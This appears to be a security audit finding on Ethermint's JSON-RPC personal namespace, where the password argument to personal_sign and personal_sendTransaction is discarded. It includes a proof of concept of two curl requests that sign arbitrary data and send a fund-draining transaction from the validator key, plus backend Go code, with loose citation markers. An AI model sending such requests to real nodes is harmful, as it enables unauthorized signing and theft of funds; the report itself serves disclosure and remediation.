### Title
Password Parameter Silently Ignored in `personal_sign` and `personal_sendTransaction` — Unauthorized Signing of Node-Managed Keys via JSON-RPC - (File: rpc/namespaces/ethereum/personal/api.go)

### Summary

The `personal_sign` and `personal_sendTransaction` JSON-RPC methods in Ethermint's `PrivateAccountAPI` accept a `password` parameter as required by the Ethereum personal namespace specification, but both implementations silently discard the password entirely. Any caller who can reach the JSON-RPC endpoint while the `personal` namespace is enabled can request arbitrary message signatures or submit transactions from any address held in the node's keyring — without supplying the correct password. This is a direct authentication bypass over a public-facing RPC path.

### Finding Description

The Ethereum `personal_*` namespace is designed so that sensitive operations (signing, sending) require the caller to supply the account password to decrypt the key. Ethermint implements this namespace but drops the password on the floor in both critical methods.

```go

    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)
}
```

The third positional parameter (the password) is bound to the blank identifier `_`. It is never forwarded to the backend. [1](#0-0)

### Impact Explanation

When the `personal` namespace is enabled (as shown in the reference deployment script), any network-reachable caller can:

1. Call `personal_sign` with any `address` held in the node's keyring and attacker-controlled `data`. The node signs the data with the node's private key and returns the 65-byte ECDSA signature — no password required. This signature can be used as an EIP-712 typed-data authorization, an `eth_sign` authorization, or any off-chain authentication scheme that trusts node-signed messages.

2. Call `personal_sendTransaction` specifying `from` as any address in the node's keyring. The node signs and broadcasts a fully valid EVM transaction — transferring funds, deploying contracts, or calling arbitrary contract methods — without the caller knowing the account password.

This constitutes unauthorized fund transfer from node-managed EVM accounts and unauthorized account/code mutation, matching the **High** allowed impact: *Ethereum transaction signer verification bypass enabling unauthorized account/code mutation* and *Public JSON-RPC path exposes a reachable route to the impacts above*.

### Likelihood Explanation

- The `personal` namespace is listed as a standard available namespace and is enabled in the reference `init.sh` deployment script.
- No authentication, IP allowlist, or CORS restriction is enforced at the RPC layer by default.
- The attack requires only a single unauthenticated HTTP POST to the JSON-RPC endpoint — no special privileges, no on-chain state, no cryptographic material.
- The node's keyring holds the validator key and any keys imported via `personal_importRawKey` or `unsafe-import-eth-key`.

### Recommendation

1. **Enforce the password parameter**: Before calling `Keyring.SignByAddress`, decrypt and verify the key using the supplied password. If the keyring backend does not support per-call password decryption (the current `TODO` comment references this limitation), the method must return an explicit error rather than silently proceeding.

2. **Disable the `personal` namespace by default**: Remove `personal` from `GetDefaultAPINamespaces()` and from any reference deployment scripts. Operators who need it must opt in explicitly and should do so only over a TLS-protected, IP-restricted endpoint.

3. **Add an explicit guard**: At minimum, add a check that rejects `personal_sign` and `personal_sendTransaction` calls when the keyring backend is `test` (no password protection) or when the password argument is empty, until proper password verification is implemented.

### Proof of Concept

With a node started as shown in `init.sh` (keyring-backend `test`, `personal` namespace enabled on port 8545):

```bash
# Sign arbitrary attacker-controlled data with the validator's key — no password needed
curl -X POST http://localhost:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0","method":"personal_sign",
    "params":["0xdeadbeef","<validator_eth_address>","wrong_password"],
    "id":1
  }'
# Returns a valid 65-byte ECDSA signature from the validator key.

# Send a fund-draining transaction — no password needed
curl -X POST http://localhost:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0","method":"personal_sendTransaction",
    "params":[{"from":"<validator_eth_address>","to":"<attacker_address>","value":"0xDE0B6B3A7640000"},"wrong_password"],
    "id":2
  }'
# Node signs and broadcasts the transaction, draining 1 ETH-equivalent from the validator account.
```

The password `"wrong_password"` is accepted without error because it is never checked. The node signs and broadcasts using the keyring directly. [7](#0-6) [8](#0-7) [9](#0-8)

func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}

	// Query params to use the EVM denomination
	res, err := b.queryClient.Params(b.ctx, &evmtypes.QueryParamsRequest{})
	if err != nil {
		b.logger.Error("failed to query evm params", "error", err.Error())
		return common.Hash{}, err
	}

	// Assemble transaction from fields
	tx, err := msg.BuildTx(b.clientCtx.TxConfig.NewTxBuilder(), res.Params.EvmDenom)
	if err != nil {
		b.logger.Error("build cosmos tx failed", "error", err.Error())
		return common.Hash{}, err
	}

	// Encode transaction by default Tx encoder
	txEncoder := b.clientCtx.TxConfig.TxEncoder()
	txBytes, err := txEncoder(tx)
	if err != nil {
		b.logger.Error("failed to encode eth tx using default encoder", "error", err.Error())
		return common.Hash{}, err
	}

	ethTx := msg.AsTransaction()

	// check the local node config in case unprotected txs are disabled
	if !b.UnprotectedAllowed() && !ethTx.Protected() {
		// Ensure only eip155 signed transactions are submitted if EIP155Required is set.
		return common.Hash{}, errors.New("only replay-protected (EIP-155) transactions allowed over RPC")
	}

	txHash := ethTx.Hash()

	// Broadcast transaction in sync mode (default)
	// NOTE: If error is encountered on the node, the broadcast will not return an error
	rsp, err := b.broadcastTx(txBytes)
	if rsp != nil && rsp.Code != 0 {
		err = errorsmod.ABCIError(rsp.Codespace, rsp.Code, rsp.RawLog)
	}
	if err != nil {
		b.logger.Error("failed to broadcast tx", "error", err.Error())
		return txHash, err
	}

	// Return transaction hash
	return txHash, nil
}

func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
	from := sdk.AccAddress(address.Bytes())

	_, err := b.clientCtx.Keyring.KeyByAddress(from)
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", address.String())
		return nil, fmt.Errorf("%s; %s", keystore.ErrNoMatch, err.Error())
	}

	// Apply EIP-191 signed-message prefix to domain-separate personal
	// signatures from transaction signatures (matching Geth's eth_sign).
	signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), signingtypes.SignMode_SIGN_MODE_TEXTUAL)
	if err != nil {
		b.logger.Error("keyring.SignByAddress failed", "address", address.Hex())
		return nil, err
	}

	signature[crypto.RecoveryIDOffset] += 27 // Transform V from 0/1 to 27/28 according to the yellow paper
	return signature, nil
}
